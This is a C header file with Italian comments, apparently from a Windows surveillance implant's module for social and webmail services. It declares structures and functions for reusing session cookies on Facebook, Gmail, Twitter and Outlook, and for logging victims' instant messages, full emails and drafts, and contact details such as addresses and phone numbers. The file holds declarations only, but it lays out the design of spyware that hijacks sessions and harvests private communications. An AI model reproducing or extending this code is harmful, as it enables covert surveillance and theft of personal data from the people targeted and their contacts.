#ifndef _SOCIAL_H
#define _SOCIAL_H
#include <Windows.h>
#pragma pack(1)

#define SOCIAL_ENTRY_COUNT 4

#define FACEBOOK_DOMAIN L"facebook.com" // FIXME array-izza!
#define GMAIL_DOMAIN L"mail.google.com"
#define TWITTER_DOMAIN L"twitter.com"
#define OUTLOOK_DOMAIN L"live.com"

#define FACEBOOK_DOMAINA "facebook.com"
#define GMAIL_DOMAINA "mail.google.com"
#define TWITTER_DOMAINA "twitter.com"
#define OUTLOOK_DOMAINA "live.com"


#ifndef _DEBUG
#define SLEEP_COOKIE 30 // In secondi
#else
#define SLEEP_COOKIE 10
#endif

#define SOCIAL_LONG_IDLE 20 // In multipli di SLEEP_COOKIE (10 minuti)
#define SOCIAL_SHORT_IDLE 4 // In multipli di SLEEP_COOKIE (2 minuti)

#define SOCIAL_REQUEST_SUCCESS 0
#define SOCIAL_REQUEST_BAD_COOKIE 1
#define SOCIAL_REQUEST_NETWORK_PROBLEM 2

#define SOCIAL_MAX_ACCOUNTS 500 
#define SOCIAL_INVALID_TSTAMP 0xFFFFFFFF

#define CHAT_PROGRAM_FACEBOOK 0x02
#define CHAT_PROGRAM_TWITTER  0x03

#define CONTACTS_MYACCOUNT 0x80000000

#define CONTACT_SRC_OUTLOOK  1
#define CONTACT_SRC_SKYPE    2
#define CONTACT_SRC_FACEBOOK 3
#define CONTACT_SRC_TWITTER  4
#define CONTACT_SRC_GMAIL    5

#define DEFAULT_MAX_MAIL_SIZE (1024*1000)


typedef DWORD (*SocialHandler_p)(LPSTR);

typedef struct 
{
	WCHAR strDomain[64];
	DWORD dwIdle;
	BOOL bWaitCookie;
	BOOL bNewCookie;
	SocialHandler_p fpRequestHandler;
} SOCIAL_ENTRY, *LPSOCIAL_ENTRY;

extern SOCIAL_ENTRY pSocialEntry[SOCIAL_ENTRY_COUNT];

typedef struct
{
	CHAR strUser[48];
	DWORD dwTimeLow;
	DWORD dwTimeHi;
} SOCIAL_TIMESTAMPS, *LPSOCIAL_TIMESTAMPS;

extern SOCIAL_TIMESTAMPS pSocialTimeStamps[SOCIAL_MAX_ACCOUNTS];

typedef struct _SOCIAL_CONTACT_HEADER
{
        DWORD           dwSize;
        DWORD           dwVersion;
        LONG            lOid;
		DWORD			dwProgram;
		DWORD			dwFlags;
} SOCIAL_CONTACT_HEADER, *LSOCIAL_CONTACT_HEADER;


#define MAX_SOCIAL_QUEUE 5000
typedef struct 
{
	DWORD dwSize;
	LPBYTE lpBuffer;
} SOCIAL_LOGS, *LPSOCIAL_LOGS;

extern SOCIAL_LOGS lpSocialLogs[MAX_SOCIAL_QUEUE];
extern DWORD dwSocialLogs;


typedef struct SOCIAL_MAIL_MESSSAGE_HEADER
{
  DWORD dwVersionFlags;       // flags for parsing serialized message
#define MAIL_FULL_BODY 0x00000001 // Ha catturato tutta la mail 
#define MAIL_INCOMING  0x00000010
#define MAIL_OUTGOING  0x00000000
#define MAIL_DRAFT     0x00000100
  DWORD dwFlags;               // message flags
  DWORD dwSize;                // message size
  FILETIME fDate;			 // data di ricezione approssimativa del messaggio
 #define MAIL_GMAIL     0x00000000
 #define MAIL_OUTLOOK	0x00000004
  DWORD dwProgram;
} SOCIAL_MAIL_MESSSAGE_HEADER, *LPSOCIAL_MAIL_MESSSAGE_HEADER;

#define MAPI_V3_0_PROTO	2012030601

VOID SocialMain();
BOOL IsInterestingDomainW(LPWSTR strDomain);
BOOL IsInterestingDomainA(LPSTR strDomain);
DWORD HttpSocialRequest(
	__in LPWSTR strHostName, 
	__in LPWSTR strHttpVerb, 
	__in LPWSTR strHttpRsrc, 
	__in DWORD dwPort, 
	__in LPBYTE *lpSendBuff, 
	__in DWORD dwSendBuffSize, 
	__out LPBYTE *lpRecvBuff, 
	__out DWORD *dwRespSize, 
	__in LPSTR strCookies);
BOOL SocialLoadTimeStamps();
BOOL SocialSaveTimeStamps();
DWORD SocialGetLastTimestamp(__in LPSTR strUser, __out LPDWORD dwHighPart);
VOID SocialSetLastTimestamp(__in LPSTR strUser, __in DWORD dwLowPart, __in DWORD dwHighPart);


VOID SocialLogIMMessageA(
	__in DWORD dwProgram, 
	__in LPSTR strPeers, 
	__in LPSTR strPeersId, 
	__in LPSTR strAuthor, 
	__in LPSTR strAuthorId, 
	__in LPSTR strBody,
	__in struct tm *tStamp, 
	__in BOOL bIncoming);

VOID SocialLogIMMessageW(
	__in DWORD dwProgram, 
	__in LPWSTR strPeers, 
	__in LPWSTR strPeersId, 
	__in LPWSTR strAuthor, 
	__in LPWSTR strAuthorId, 
	__in LPWSTR strBody,
	__in struct tm *tStamp, 
	__in BOOL bIncoming);

VOID SocialLogContactW(
	__in DWORD dwProgram,
	__in LPWSTR strUserName,
	__in LPWSTR strEmail,
	__in LPWSTR strCompany,
	__in LPWSTR strHomeAddr,
	__in LPWSTR strOfficeAddr,
	__in LPWSTR strOfficePhone,
	__in LPWSTR strMobilePhone,
	__in LPWSTR strHomePhone,
	__in LPWSTR strScreenName, 
	__in LPWSTR strFacebookProfile,
	__in DWORD dwFlags);

VOID SocialLogMailFull(
	__in DWORD dwProgram,
	__in LPSTR lpBuffer,
	__in DWORD dwBufferSize,
	__in BOOL bIncoming,
	__in BOOL bDraft);

VOID SocialDeleteTimeStamps();

#endif _SOCIAL_H